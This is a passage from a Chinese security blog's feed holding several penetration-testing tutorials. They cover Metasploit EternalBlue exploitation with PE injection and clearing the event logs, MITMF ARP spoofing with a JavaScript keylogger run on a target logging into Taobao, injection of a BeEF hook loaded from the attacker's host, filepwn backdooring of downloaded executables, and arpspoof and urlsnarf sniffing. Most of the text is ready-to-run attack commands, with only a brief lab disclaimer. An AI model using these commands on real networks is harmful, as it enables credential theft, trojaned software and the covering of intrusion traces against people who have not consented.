<h3 id="7-笔者扫到win-7就有这个漏洞，然后就愉快的调用exp搞一波"><a href="#7-笔者扫到win-7就有这个漏洞，然后就愉快的调用exp搞一波" class="headerlink" title="7. 笔者扫到win 7就有这个漏洞，然后就愉快的调用exp搞一波"></a>7. 笔者扫到win 7就有这个漏洞，然后就愉快的调用exp搞一波</h3><blockquote>
<p>use exploit/windows/smb/ms17_010_eternalblue</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/C4989785A16647D4883A6E243CA78443/2851" alt="image"></p>
<h3 id="8-在靶机的指定应用中注入恶意代码"><a href="#8-在靶机的指定应用中注入恶意代码" class="headerlink" title="8.在靶机的指定应用中注入恶意代码"></a>8.在靶机的指定应用中注入恶意代码</h3><blockquote>
<p>use post/windows/manage/peinjector</p>
</blockquote>
<h3 id="9-功成身退"><a href="#9-功成身退" class="headerlink" title="9. 功成身退"></a>9. 功成身退</h3><blockquote>
<p>clearev</p>
<hr>
<h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="emsp-emsp-msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！"><a href="#emsp-emsp-msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！" class="headerlink" title="&emsp;&emsp;msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！"></a>&emsp;&emsp;msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！</h4></blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-Metasploit-Framework简介&quot;&gt;&lt;a href=&quot;#0x00-Metasploit-Framework简介&quot; class=&quot;headerlink&quot; title=&quot;0x00. Metasploit Framework简介&quot;&gt;&lt;/a&gt;0x00. Metasploit Framework简介&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！&quot;&gt;&lt;a href=&quot;#emsp-emsp-Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MITMF</title>
    <link href="http://TimeS0ng.github.io/2017/10/02/MITMF/"/>
    <id>http://TimeS0ng.github.io/2017/10/02/MITMF/</id>
    <published>2017-10-02T10:54:47.000Z</published>
    <updated>2017-10-03T01:59:01.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-MITMF简介"><a href="#0x00-MITMF简介" class="headerlink" title="0x00. MITMF简介"></a>0x00. MITMF简介</h2><h4 id="emsp-emsp-MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。"><a href="#emsp-emsp-MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。" class="headerlink" title="&emsp;&emsp;MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。"></a>&emsp;&emsp;MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。</h4><a id="more"></a>
<hr>
<h2 id="0x01-MITMF安装"><a href="#0x01-MITMF安装" class="headerlink" title="0x01. MITMF安装"></a>0x01. MITMF安装</h2><blockquote>
<p>apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file &amp;&amp; apt-get install mitmf</p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/9E27BD005D5540E1934FE452379DFAC2/2572" alt="image"></p>
<hr>
<p>pip uninstall twisted &amp;&amp; wget <a href="http://twistedmatrix.com/Releases/Twisted/15.5/Twisted-15.5.0.tar.bz2" target="_blank" rel="external">http://twistedmatrix.com/Releases/Twisted/15.5/Twisted-15.5.0.tar.bz2</a> &amp;&amp; pip install ./Twisted-15.5.0.tar.bz2</p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/FCCFFCEFDA2945498587A8278D460BDF/2583" alt="image"></p>
<hr>
<p>pip install python-magic &amp;&amp; git clone <a href="https://github.com/secretsquirrel/the-backdoor-factory.git" target="_blank" rel="external">https://github.com/secretsquirrel/the-backdoor-factory.git</a> &amp;&amp; cd the-backdoor-factory &amp;&amp; ./install.sh</p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/488111F29FED41F785D4100CBCAA9E24/2587" alt="image"><br><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/FEE9D91E745048719660B931704CBFE1/2589" alt="image"></p>
<hr>
<h2 id="0x02-jskeylogger模块"><a href="#0x02-jskeylogger模块" class="headerlink" title="0x02. jskeylogger模块"></a>0x02. jskeylogger模块</h2><h3 id="1-启动MITMF的键盘记录模块（注：有时MITMF不能正常运行，但是笔者访问了http-127-0-0-1-9999之后却能运行成功，可能是什么BUG）"><a href="#1-启动MITMF的键盘记录模块（注：有时MITMF不能正常运行，但是笔者访问了http-127-0-0-1-9999之后却能运行成功，可能是什么BUG）" class="headerlink" title="1. 启动MITMF的键盘记录模块（注：有时MITMF不能正常运行，但是笔者访问了http://127.0.0.1:9999之后却能运行成功，可能是什么BUG）"></a>1. 启动MITMF的键盘记录模块（注：有时MITMF不能正常运行，但是笔者访问了<a href="http://127.0.0.1:9999之后却能运行成功，可能是什么BUG）" target="_blank" rel="external">http://127.0.0.1:9999之后却能运行成功，可能是什么BUG）</a></h3><p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; mitmf <strong>-</strong>-spoof <strong>-</strong>-arp -i eth0 <strong>-</strong>-gateway 192.168.1.1 <strong>-</strong>-target 192.168.1.106 <strong>-</strong>-jskeylogger</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/08471581A373436BA52AF5C79DC84E23/2624" alt="image"></p>
<h3 id="2-靶机登陆淘宝，查看效果（这里编码出了点问题）"><a href="#2-靶机登陆淘宝，查看效果（这里编码出了点问题）" class="headerlink" title="2. 靶机登陆淘宝，查看效果（这里编码出了点问题）"></a>2. 靶机登陆淘宝，查看效果（这里编码出了点问题）</h3><p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/0E7E0B2DBA154FEC8F737B1A63D9A63B/2622" alt="image"><br><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/5BF3C0C24C4B4D1B8F0E1CECB8654F6C/2619" alt="image"></p>
<hr>
<h2 id="0x03-js-url模块"><a href="#0x03-js-url模块" class="headerlink" title="0x03. --js-url模块"></a>0x03. <strong>-</strong>-js-url模块</h2><h3 id="1-启动beef，构造hook-注：beef的账号密码都是beef"><a href="#1-启动beef，构造hook-注：beef的账号密码都是beef" class="headerlink" title="1. 启动beef，构造hook(注：beef的账号密码都是beef)"></a>1. 启动beef，构造hook(注：beef的账号密码都是beef)</h3><p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/EB22D3CBBA2B46F5989DE151AE4A330E/2636" alt="image"></p>
<h3 id="2-启动-js-url模块向目标网页插入hook代码"><a href="#2-启动-js-url模块向目标网页插入hook代码" class="headerlink" title="2. 启动--js-url模块向目标网页插入hook代码"></a>2. 启动<strong>-</strong>-js-url模块向目标网页插入hook代码</h3><blockquote>
<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; mitmf <strong>-</strong>-spoof <strong>-</strong>-arp -i eth0 <strong>-</strong>-gateway 192.168.1.1 <strong>-</strong>-target 192.168.1.106 <strong>-</strong>-inject <strong>-</strong>-js-url <a href="http://192.168.1.105:3000/hook.js" target="_blank" rel="external">http://192.168.1.105:3000/hook.js</a></p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/28035242C8EC463ABB136633BD18CCA1/2643" alt="image"></p>
<h3 id="3-启动靶机访问任意页面，可以看到js-已经注入到页面当中，玩过beef的都知道它的强大，但是笔者的beef出了点问题，就不给大家演示了，有兴趣的可以自己去搜一下"><a href="#3-启动靶机访问任意页面，可以看到js-已经注入到页面当中，玩过beef的都知道它的强大，但是笔者的beef出了点问题，就不给大家演示了，有兴趣的可以自己去搜一下" class="headerlink" title="3. 启动靶机访问任意页面，可以看到js 已经注入到页面当中，玩过beef的都知道它的强大，但是笔者的beef出了点问题，就不给大家演示了，有兴趣的可以自己去搜一下"></a>3. 启动靶机访问任意页面，可以看到js 已经注入到页面当中，玩过beef的都知道它的强大，但是笔者的beef出了点问题，就不给大家演示了，有兴趣的可以自己去搜一下</h3><p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/6FD54CD991C341BF82D6B8AEBB86425D/2648" alt="image"></p>
<hr>
<h2 id="0x04-filepwn模块"><a href="#0x04-filepwn模块" class="headerlink" title="0x04. --filepwn模块"></a>0x04. <strong>-</strong>-filepwn模块</h2><h3 id="1-启动msf，加载msgrpc模块"><a href="#1-启动msf，加载msgrpc模块" class="headerlink" title="1. 启动msf，加载msgrpc模块"></a>1. 启动msf，加载msgrpc模块</h3><blockquote>
<p>service postgresql start &amp;&amp; msfconsole</p>
<p>load msgrpc</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/541CEE320BAC44CABAAA1EB69002EDC9/2661" alt="image"></p>
<h3 id="2-改写配置文件"><a href="#2-改写配置文件" class="headerlink" title="2. 改写配置文件"></a>2. 改写配置文件</h3><blockquote>
<p>gedit /usr/share/mitmf/config/mitmf.conf</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/C0188D9FB7E44C70987E2150C2725D5A/2666" alt="image"></p>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/319EF71A78BF44D28BE76DB169073226/2673" alt="image"></p>
<h3 id="3-启动mitmf，开启filepwn-之后msf会自动加载几个exp进行侦听"><a href="#3-启动mitmf，开启filepwn-之后msf会自动加载几个exp进行侦听" class="headerlink" title="3. 启动mitmf，开启filepwn,之后msf会自动加载几个exp进行侦听"></a>3. 启动mitmf，开启filepwn,之后msf会自动加载几个exp进行侦听</h3><blockquote>
<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; mitmf <strong>-</strong>-spoof –arp -i eth0 <strong>-</strong>-gateway 192.168.1.1 <strong>-</strong>-target 192.168.1.106 <strong>-</strong>-filepwn</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/AA2890664C1943EB999402A041B24051/2696" alt="image"></p>
<h3 id="4-filepwn的原理就是在靶机下载可执行程序时将木马插入程序里，执行程序时就会启动木马，所以接下来我用靶机下载一个putty程序"><a href="#4-filepwn的原理就是在靶机下载可执行程序时将木马插入程序里，执行程序时就会启动木马，所以接下来我用靶机下载一个putty程序" class="headerlink" title="4. filepwn的原理就是在靶机下载可执行程序时将木马插入程序里，执行程序时就会启动木马，所以接下来我用靶机下载一个putty程序"></a>4. filepwn的原理就是在靶机下载可执行程序时将木马插入程序里，执行程序时就会启动木马，所以接下来我用靶机下载一个putty程序</h3><p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/D3F3F5BBFC4542C6987C331989E39E5C/2699" alt="image"></p>
<h3 id="5-之后正常情况下msf应该就能接收到木马的连接，但是不知道是笔者环境出了问题还是姿势不对，msf老是报错，希望有经验的读者可以告诉我解决的办法，谢谢"><a href="#5-之后正常情况下msf应该就能接收到木马的连接，但是不知道是笔者环境出了问题还是姿势不对，msf老是报错，希望有经验的读者可以告诉我解决的办法，谢谢" class="headerlink" title="5. 之后正常情况下msf应该就能接收到木马的连接，但是不知道是笔者环境出了问题还是姿势不对，msf老是报错，希望有经验的读者可以告诉我解决的办法，谢谢"></a>5. 之后正常情况下msf应该就能接收到木马的连接，但是不知道是笔者环境出了问题还是姿势不对，msf老是报错，希望有经验的读者可以告诉我解决的办法，谢谢</h3><p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/E829CBB57EB74BE0AFE4CE80CCBDC83A/2701" alt="image"></p>
<hr>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="emsp-emsp-经常遇到玄学问题，可能还是由于自己比较菜，所以希望有大神看到我的文章之后能email-me，我们一起探讨玄学！"><a href="#emsp-emsp-经常遇到玄学问题，可能还是由于自己比较菜，所以希望有大神看到我的文章之后能email-me，我们一起探讨玄学！" class="headerlink" title="&emsp;&emsp;经常遇到玄学问题，可能还是由于自己比较菜，所以希望有大神看到我的文章之后能email me，我们一起探讨玄学！"></a>&emsp;&emsp;经常遇到玄学问题，可能还是由于自己比较菜，所以希望有大神看到我的文章之后能<a href="mailto:TimeS0ng@163.com" target="_blank" rel="external">email me</a>，我们一起探讨玄学！</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-MITMF简介&quot;&gt;&lt;a href=&quot;#0x00-MITMF简介&quot; class=&quot;headerlink&quot; title=&quot;0x00. MITMF简介&quot;&gt;&lt;/a&gt;0x00. MITMF简介&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。&quot;&gt;&lt;a href=&quot;#emsp-emsp-MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>无线渗透(序章)--中间人攻击</title>
    <link href="http://TimeS0ng.github.io/2017/10/02/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F-%E5%BA%8F%E7%AB%A0-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    <id>http://TimeS0ng.github.io/2017/10/02/无线渗透-序章-中间人攻击/</id>
    <published>2017-10-02T06:53:57.000Z</published>
    <updated>2017-10-02T06:58:21.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-MITM简介"><a href="#0x00-MITM简介" class="headerlink" title="0x00. MITM简介"></a>0x00. MITM简介</h2><h4 id="emsp-emsp-中间人攻击-MITM-是一种由来已久的攻击手段，简单点说也就是截获你的流量，然后篡改或者嗅探流量，而且就算是老成的网络“高手”也不一定能发现自己中招了，接下来就由笔者给大家逐一介绍其中的攻击原理和防御手段。"><a href="#emsp-emsp-中间人攻击-MITM-是一种由来已久的攻击手段，简单点说也就是截获你的流量，然后篡改或者嗅探流量，而且就算是老成的网络“高手”也不一定能发现自己中招了，接下来就由笔者给大家逐一介绍其中的攻击原理和防御手段。" class="headerlink" title="&emsp;&emsp;中间人攻击(MITM)是一种由来已久的攻击手段，简单点说也就是截获你的流量，然后篡改或者嗅探流量，而且就算是老成的网络“高手”也不一定能发现自己中招了，接下来就由笔者给大家逐一介绍其中的攻击原理和防御手段。"></a>&emsp;&emsp;中间人攻击(MITM)是一种由来已久的攻击手段，简单点说也就是截获你的流量，然后篡改或者嗅探流量，而且就算是老成的网络“高手”也不一定能发现自己中招了，接下来就由笔者给大家逐一介绍其中的攻击原理和防御手段。</h4><a id="more"></a>
<hr>
<h2 id="0x01-ARP协议分析"><a href="#0x01-ARP协议分析" class="headerlink" title="0x01. ARP协议分析"></a>0x01. ARP协议分析</h2><h4 id="emsp-emsp-ARP即地址解析协议，数据包在以太网中传输时需要有两个地址，一个是IP地址，另一个就是MAC地址。其中的IP地址只是用来进行逻辑寻址的，以太网并不能通过IP地址进行通信，因为IP地址是可以变换的，基于IP的通信不可靠也不安全，所以在以太网中主要是靠MAC地址进行物理通信，因为电脑的MAC地址在出产时就已经设定好，一般不会改变，而ARP协议就是用来帮助主机获取目标主机的MAC地址！"><a href="#emsp-emsp-ARP即地址解析协议，数据包在以太网中传输时需要有两个地址，一个是IP地址，另一个就是MAC地址。其中的IP地址只是用来进行逻辑寻址的，以太网并不能通过IP地址进行通信，因为IP地址是可以变换的，基于IP的通信不可靠也不安全，所以在以太网中主要是靠MAC地址进行物理通信，因为电脑的MAC地址在出产时就已经设定好，一般不会改变，而ARP协议就是用来帮助主机获取目标主机的MAC地址！" class="headerlink" title="&emsp;&emsp;ARP即地址解析协议，数据包在以太网中传输时需要有两个地址，一个是IP地址，另一个就是MAC地址。其中的IP地址只是用来进行逻辑寻址的，以太网并不能通过IP地址进行通信，因为IP地址是可以变换的，基于IP的通信不可靠也不安全，所以在以太网中主要是靠MAC地址进行物理通信，因为电脑的MAC地址在出产时就已经设定好，一般不会改变，而ARP协议就是用来帮助主机获取目标主机的MAC地址！"></a>&emsp;&emsp;ARP即地址解析协议，数据包在以太网中传输时需要有两个地址，一个是IP地址，另一个就是MAC地址。其中的IP地址只是用来进行逻辑寻址的，以太网并不能通过IP地址进行通信，因为IP地址是可以变换的，基于IP的通信不可靠也不安全，所以在以太网中主要是靠MAC地址进行物理通信，因为电脑的MAC地址在出产时就已经设定好，一般不会改变，而ARP协议就是用来帮助主机获取目标主机的MAC地址！</h4><h2 id="ARP通信过程："><a href="#ARP通信过程：" class="headerlink" title="ARP通信过程："></a>ARP通信过程：</h2><h4 id="1-首先，每台主机都会在自己的ARP缓冲区建立一个ARP列表，用于表示IP地址和MAC地址的对应关系"><a href="#1-首先，每台主机都会在自己的ARP缓冲区建立一个ARP列表，用于表示IP地址和MAC地址的对应关系" class="headerlink" title="1. 首先，每台主机都会在自己的ARP缓冲区建立一个ARP列表，用于表示IP地址和MAC地址的对应关系"></a>1. 首先，每台主机都会在自己的ARP缓冲区建立一个ARP列表，用于表示IP地址和MAC地址的对应关系</h4><h4 id="2-当源主机需要向目标主机发送数据包时，会先检查自己的ARP缓冲区是否有该IP对应的MAC地址，如果有就直接发送数据包到该MAC地址；如果没有那么源主机就会在本网段发ARP广播包，查询目标主机的IP对应的MAC地址（注：这里只讨论局域网环境）"><a href="#2-当源主机需要向目标主机发送数据包时，会先检查自己的ARP缓冲区是否有该IP对应的MAC地址，如果有就直接发送数据包到该MAC地址；如果没有那么源主机就会在本网段发ARP广播包，查询目标主机的IP对应的MAC地址（注：这里只讨论局域网环境）" class="headerlink" title="2. 当源主机需要向目标主机发送数据包时，会先检查自己的ARP缓冲区是否有该IP对应的MAC地址，如果有就直接发送数据包到该MAC地址；如果没有那么源主机就会在本网段发ARP广播包，查询目标主机的IP对应的MAC地址（注：这里只讨论局域网环境）"></a>2. 当源主机需要向目标主机发送数据包时，会先检查自己的ARP缓冲区是否有该IP对应的MAC地址，如果有就直接发送数据包到该MAC地址；如果没有那么源主机就会在本网段发ARP广播包，查询目标主机的IP对应的MAC地址（注：这里只讨论局域网环境）</h4><h4 id="3-接收到ARP广播包的主机会检查数据包中的目的IP地址和自己的IP地址是否一致，如果不同则丢弃数据包；如果相同那么目标主机会先将数据包中的IP-MAC对应关系缓存到自己的ARP列表中，并且会覆盖原本属于这个IP对应的MAC（注：这是中间人攻击的关键），然后给源主机发送一个-ARP响应数据包，告诉对方自己是它需要查找的MAC地址"><a href="#3-接收到ARP广播包的主机会检查数据包中的目的IP地址和自己的IP地址是否一致，如果不同则丢弃数据包；如果相同那么目标主机会先将数据包中的IP-MAC对应关系缓存到自己的ARP列表中，并且会覆盖原本属于这个IP对应的MAC（注：这是中间人攻击的关键），然后给源主机发送一个-ARP响应数据包，告诉对方自己是它需要查找的MAC地址" class="headerlink" title="3. 接收到ARP广播包的主机会检查数据包中的目的IP地址和自己的IP地址是否一致，如果不同则丢弃数据包；如果相同那么目标主机会先将数据包中的IP/MAC对应关系缓存到自己的ARP列表中，并且会覆盖原本属于这个IP对应的MAC（注：这是中间人攻击的关键），然后给源主机发送一个 ARP响应数据包，告诉对方自己是它需要查找的MAC地址"></a>3. 接收到ARP广播包的主机会检查数据包中的目的IP地址和自己的IP地址是否一致，如果不同则丢弃数据包；如果相同那么目标主机会先将数据包中的IP/MAC对应关系缓存到自己的ARP列表中，并且会覆盖原本属于这个IP对应的MAC（注：这是中间人攻击的关键），然后给源主机发送一个 ARP响应数据包，告诉对方自己是它需要查找的MAC地址</h4><h4 id="4-源主机收到这个ARP响应数据包后，将得到的目的主机的IP地址和MAC地址添加到自己的ARP列表中，并利用此信息开始数据的传输。"><a href="#4-源主机收到这个ARP响应数据包后，将得到的目的主机的IP地址和MAC地址添加到自己的ARP列表中，并利用此信息开始数据的传输。" class="headerlink" title="4. 源主机收到这个ARP响应数据包后，将得到的目的主机的IP地址和MAC地址添加到自己的ARP列表中，并利用此信息开始数据的传输。"></a>4. 源主机收到这个ARP响应数据包后，将得到的目的主机的IP地址和MAC地址添加到自己的ARP列表中，并利用此信息开始数据的传输。</h4><hr>
<h2 id="0x02-ARP劫持原理"><a href="#0x02-ARP劫持原理" class="headerlink" title="0x02. ARP劫持原理"></a>0x02. ARP劫持原理</h2><p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/WEBRESOURCEb7f818f776d09e9d0e00809840cb7713/2403" alt="image"></p>
<h3 id="emsp-emsp-如上图所示，中间人攻击也就是将原本正常client-lt-——-gt-server之间的通信劫持下来变成client-lt-——-gt-attacker-lt-——-gt-server-让客户端和服务端的流量都从attacker的电脑经过，此时的attacker就可以侦听流经本机的流量并进行篡改和嗅探。下面介绍如何让attacker成为中间人。"><a href="#emsp-emsp-如上图所示，中间人攻击也就是将原本正常client-lt-——-gt-server之间的通信劫持下来变成client-lt-——-gt-attacker-lt-——-gt-server-让客户端和服务端的流量都从attacker的电脑经过，此时的attacker就可以侦听流经本机的流量并进行篡改和嗅探。下面介绍如何让attacker成为中间人。" class="headerlink" title="&emsp;&emsp;如上图所示，中间人攻击也就是将原本正常client&lt;——&gt;server之间的通信劫持下来变成client&lt;——&gt;attacker&lt;——&gt;server,让客户端和服务端的流量都从attacker的电脑经过，此时的attacker就可以侦听流经本机的流量并进行篡改和嗅探。下面介绍如何让attacker成为中间人。"></a>&emsp;&emsp;如上图所示，中间人攻击也就是将原本正常client&lt;——&gt;server之间的通信劫持下来变成client&lt;——&gt;attacker&lt;——&gt;server,让客户端和服务端的流量都从attacker的电脑经过，此时的attacker就可以侦听流经本机的流量并进行篡改和嗅探。下面介绍如何让attacker成为中间人。</h3><h3 id="MITM原理"><a href="#MITM原理" class="headerlink" title="MITM原理"></a>MITM原理</h3><h4 id="1-一开始笔者就介绍了ARP协议的通信原理，之所以这么做是想让大家对协议有更深入的理解，然后更好的弄清楚中间人的本质，这样才知道如何防御"><a href="#1-一开始笔者就介绍了ARP协议的通信原理，之所以这么做是想让大家对协议有更深入的理解，然后更好的弄清楚中间人的本质，这样才知道如何防御" class="headerlink" title="1. 一开始笔者就介绍了ARP协议的通信原理，之所以这么做是想让大家对协议有更深入的理解，然后更好的弄清楚中间人的本质，这样才知道如何防御"></a>1. 一开始笔者就介绍了ARP协议的通信原理，之所以这么做是想让大家对协议有更深入的理解，然后更好的弄清楚中间人的本质，这样才知道如何防御</h4><h4 id="2-其实电脑是很笨的，它并不能向人类那样灵敏的思考，就好比我们直接给client发送一个ARP数据包声称：我的MAC对应的IP就是网关IP，以后把你的的数据包发给我让我帮你转发吧，然后client想都不想就会相信，而且也不理会自己是否发送了ARP广播包"><a href="#2-其实电脑是很笨的，它并不能向人类那样灵敏的思考，就好比我们直接给client发送一个ARP数据包声称：我的MAC对应的IP就是网关IP，以后把你的的数据包发给我让我帮你转发吧，然后client想都不想就会相信，而且也不理会自己是否发送了ARP广播包" class="headerlink" title="2. 其实电脑是很笨的，它并不能向人类那样灵敏的思考，就好比我们直接给client发送一个ARP数据包声称：我的MAC对应的IP就是网关IP，以后把你的的数据包发给我让我帮你转发吧，然后client想都不想就会相信，而且也不理会自己是否发送了ARP广播包"></a>2. 其实电脑是很笨的，它并不能向人类那样灵敏的思考，就好比我们直接给client发送一个ARP数据包声称：我的MAC对应的IP就是网关IP，以后把你的的数据包发给我让我帮你转发吧，然后client想都不想就会相信，而且也不理会自己是否发送了ARP广播包</h4><h4 id="3-欺骗网关时也是一样的，那么之后的通信就会成为client-lt-——-gt-attacker-lt-——-gt-gateway"><a href="#3-欺骗网关时也是一样的，那么之后的通信就会成为client-lt-——-gt-attacker-lt-——-gt-gateway" class="headerlink" title="3. 欺骗网关时也是一样的，那么之后的通信就会成为client&lt;——&gt;attacker&lt;——&gt;gateway"></a>3. 欺骗网关时也是一样的，那么之后的通信就会成为client&lt;——&gt;attacker&lt;——&gt;gateway</h4><hr>
<h2 id="0x03-MITM攻击实战"><a href="#0x03-MITM攻击实战" class="headerlink" title="0x03. MITM攻击实战"></a>0x03. MITM攻击实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="1-kali-Linux"><a href="#1-kali-Linux" class="headerlink" title="1. kali Linux"></a>1. kali Linux</h4><h4 id="2-win-7靶机-emsp-IP-192-168-1-106"><a href="#2-win-7靶机-emsp-IP-192-168-1-106" class="headerlink" title="2. win 7靶机 &emsp;IP=192.168.1.106"></a>2. win 7靶机 &emsp;IP=192.168.1.106</h4><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><h3 id="1-启动kali的流量转发功能，然后启动arpspoof对靶机和网关进行双向欺骗，成为中间人"><a href="#1-启动kali的流量转发功能，然后启动arpspoof对靶机和网关进行双向欺骗，成为中间人" class="headerlink" title="1.启动kali的流量转发功能，然后启动arpspoof对靶机和网关进行双向欺骗，成为中间人"></a>1.启动kali的流量转发功能，然后启动arpspoof对靶机和网关进行双向欺骗，成为中间人</h3><blockquote>
<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; arpspoof -t 192.168.1.106 -r 192.168.1.1</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/A7F2DA5A219F4EBA88794C9D67B0E289/2465" alt="image"><br><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/F579B7E009E74BD9A555D01FB3954A88/2471" alt="image"></p>
<h3 id="2-启动urlsnarf监听靶机访问的URL"><a href="#2-启动urlsnarf监听靶机访问的URL" class="headerlink" title="2. 启动urlsnarf监听靶机访问的URL"></a>2. 启动urlsnarf监听靶机访问的URL</h3><blockquote>
<p>urlsnarf -i eth0</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/5D2C165E0F644160A05F82FAB28BA6A9/2488" alt="image"></p>
<p><img src="http://note.youdao.com/yws/public/resource/cd306aa0c5e5bfc0edf64627c56ebf6c/xmlnote/16CD22AE35964759A840DDA351D1303B/2489" alt="image"></p>
